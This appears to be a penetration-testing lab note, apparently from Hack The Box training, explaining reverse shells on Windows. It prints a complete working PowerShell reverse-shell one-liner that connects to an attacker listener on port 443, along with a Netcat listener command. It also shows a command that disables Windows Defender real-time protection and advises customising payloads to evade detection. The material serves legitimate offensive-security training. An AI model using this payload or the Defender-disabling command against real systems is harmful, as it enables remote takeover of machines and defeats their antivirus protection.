# Reverse Shells

A reverse shell inverts the connection model used in a bind shell: the operator's attack box runs the listener, and the target initiates the outbound connection back to it. This approach is operationally preferable in the vast majority of real engagements because outbound traffic is far less likely to be blocked at the perimeter or by host-based firewalls than inbound connections to arbitrary ports.

<img width="2101" height="1219" alt="image" src="https://github.com/user-attachments/assets/3ac0cd90-37f3-43f7-a8fe-6043d2476c8a" />

## Why Reverse Shells Are Preferred

Perimeter firewalls and NAT implementations are routinely configured to restrict inbound connections but permit broad outbound access, particularly on ports associated with common services. Administrators frequently overlook or deprioritise monitoring of outbound traffic, which gives reverse shells a significantly higher chance of succeeding undetected compared to bind shells. The attack box becomes the server and the target becomes the client; execution is triggered on the target through any available vector such as an unrestricted file upload, command injection, or a delivered payload.

Public resources such as the **[PayloadsAllTheThings Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)** consolidate commands, code snippets, and automated generators covering a wide range of languages and platforms. Experienced defenders are aware of these repositories and may tune detection controls against their most common patterns; customising payloads beyond the defaults is therefore advisable on monitored targets.

## Hands-on: Reverse Shell on Windows

The following walkthrough establishes a reverse shell against a Windows target using a native PowerShell one-liner, requiring no additional tooling to be transferred to the target system.

**Server (attack box): start a Netcat listener on port 443:**

```bash
sudo nc -lvnp 443

Listening on 0.0.0.0 443
```

Port 443 is used here because it is normally associated with HTTPS traffic. Blocking outbound connections on port 443 would disrupt legitimate browsing for most organisations, making it an effective choice for egress blending. A firewall with deep packet inspection and Layer 7 visibility can still detect a raw TCP reverse shell on this port by inspecting packet contents rather than relying solely on port number; detailed evasion techniques are outside the scope of this section.

**Client (target): execute the PowerShell reverse shell one-liner from Command Prompt:**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()"
```

The IP address and port within this payload must be updated to match the operator's attack box before execution. This code is the payload; delivering it to the target in this scenario was straightforward because full control of the system was available for demonstration purposes. As engagements increase in complexity, the delivery mechanism becomes progressively more challenging.

## Windows Defender Interaction

Executing the above payload with **Windows Defender** real-time protection active produces the following:

```
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Defender's AMSI (Antimalware Scan Interface) inspects the PowerShell script block at runtime and matches it against known malicious patterns. This is the expected behaviour from a defensive standpoint. For the purposes of this exercise, real-time monitoring can be disabled via an administrative PowerShell console:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

With real-time protection disabled, re-executing the payload produces a successful connection on the attack box:

```bash
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

The `PS` prefix in the prompt confirms a PowerShell session is active and that the operator now has interactive access to the target's OS and file system.

## Living Off the Land

The PowerShell one-liner used here requires no binary to be transferred to the target; it relies entirely on a Windows native interpreter and the .NET `System.Net.Sockets.TCPClient` class. This principle is referred to as living off the land: using tools and binaries already present on the target system to avoid introducing foreign executables that may trigger endpoint detection. On any system, the first question before attempting a reverse shell should be: what interpreters and networking-capable applications already exist on this host? The answer directly determines which payloads are viable without requiring a file transfer stage.
